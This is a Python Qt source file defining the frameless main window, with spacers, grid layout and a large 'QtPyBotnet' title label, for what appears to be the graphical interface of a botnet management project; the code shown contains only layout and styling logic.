from qtpy.QtGui import QFont
from qtpy.QtCore import Signal, Qt, QSize
from qtpy.QtWidgets import (QWidget, QGridLayout, QSizePolicy, QSpacerItem, QLabel)

import qrainbowstyle
from qrainbowstyle.windows import FramelessWindow


class BaseFrame(QWidget):

    def __init__(self, parent=None):
        super(BaseFrame, self).__init__(parent)
        self.setAttribute(Qt.WA_StyledBackground)
        self.setStyleSheet(qrainbowstyle.rainbowize("""
                            BaseFrame {
                            border-radius: 3px;
                            border-color: COLOR_ACCENT_3;
                            border-width: 2px;
                            }
                        """))


class BotnetWindow(FramelessWindow):
    update_ui = Signal()

    def __init__(self, parent=None):
        super(BotnetWindow, self).__init__(parent)
        self.setMouseTracking(True)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.resize(QSize(1500, 900))

        self.main_widget = QWidget(self)
        self.main_widget.setMouseTracking(True)
        self.main_widget.setAttribute(Qt.WA_TranslucentBackground)
        self.main_widget.setContentsMargins(0, 0, 0, 0)
        self.grid_layout = QGridLayout(self.main_widget)
        self.grid_layout.setContentsMargins(0, 0, 0, 0)
        self.main_widget.setLayout(self.grid_layout)

        self.spacer_left = QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding)
        self.grid_layout.addItem(self.spacer_left, 2, 1, 1, 1)

        self.spacer_top = QSpacerItem(472, 20, QSizePolicy.Expanding, QSizePolicy.Minimum)
        self.grid_layout.addItem(self.spacer_top, 1, 2, 1, 1)

        self.spacer_right = QSpacerItem(472, 20, QSizePolicy.Expanding, QSizePolicy.Minimum)
        self.grid_layout.addItem(self.spacer_right, 1, 0, 1, 1)

        self.spacer_bottom = QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding)
        self.grid_layout.addItem(self.spacer_bottom, 0, 1, 1, 1)

        self.sub_content_widget = QWidget(self.main_widget)
        self.sub_content_widget.setMouseTracking(True)
        self.sub_content_widget.setContentsMargins(0, 0, 0, 0)
        self.sub_content_layout = QGridLayout(self.sub_content_widget)
        self.sub_content_layout.setContentsMargins(0, 0, 0, 0)
        self.sub_content_widget.setLayout(self.sub_content_layout)
        self.sub_content_widget.setAttribute(Qt.WA_TranslucentBackground)
        self.grid_layout.addWidget(self.sub_content_widget, 1, 1, 1, 1)

        self.name_spacer = QSpacerItem(1, 16, QSizePolicy.Fixed, QSizePolicy.Fixed)
        self.sub_content_layout.addItem(self.name_spacer, 1, 0, 1, 1)

        self.app_name_label = QLabel(self)
        font = self.font()
        font.setPointSize(50)
        font.setWeight(QFont.Bold)
        self.app_name_label.setFont(font)
        self.app_name_label.setScaledContents(True)
        self.app_name_label.setAutoFillBackground(True)
        self.app_name_label.setAlignment(Qt.AlignCenter)
        self.app_name_label.setText("QtPyBotnet")
        self.app_name_label.setAttribute(Qt.WA_TranslucentBackground)
        self.app_name_label.setScaledContents(True)
        self.app_name_label.autoFillBackground()
        self.sub_content_layout.addWidget(self.app_name_label, 0, 0, 1, 1)

        try:
            self.closeClicked.disconnect()
        except Exception:  # noqa
            pass

        self.setSubContentSpacing(16)
        self.addContentWidget(self.main_widget)

    def addSubContentWidget(self, widget: QWidget):
        self.sub_content_layout.addWidget(widget, 2, 0, 1, 1)

    def setSubContentSpacing(self, spacing: int):
        self.sub_content_layout.setSpacing(spacing)

    def showLogo(self, value: bool):
        self.app_name_label.setVisible(value)
